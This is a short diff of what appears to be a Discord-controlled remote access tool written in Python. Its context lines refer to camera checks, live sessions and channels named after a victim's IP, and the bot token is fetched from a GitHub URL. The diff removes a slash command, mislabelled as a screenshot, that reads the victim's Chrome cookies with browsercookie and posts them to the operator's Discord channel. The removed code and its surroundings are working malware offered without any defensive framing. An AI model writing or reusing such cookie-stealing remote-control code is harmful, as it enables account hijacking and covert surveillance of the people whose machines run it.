@@ -25,7 +25,6 @@ import uuid
 import cv2
 import webbrowser
 import requests
-import browsercookie
 
 
 def check_connected_cameras():
@@ -208,16 +207,7 @@ async def stop_live_session(interaction : Interaction):
         await interaction.send(embed=embed)
         await interaction.delete_original_message()
 
-@client.slash_command(guild_ids=testServerId, description="Sends a screenshot of the client's view.")
-async def cookies(interaction : Interaction):
-    category = interaction.channel.category
-    if str(category) == str(ip):
-        
-        user_id = interaction.user.id
-        await interaction.response.send_message("Grabbing cookies...")
 
-        cookies = browsercookie.chrome()
-        await interaction.edit_original_message(content=str(cookies))
 
 r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/tok")
 token = r.text
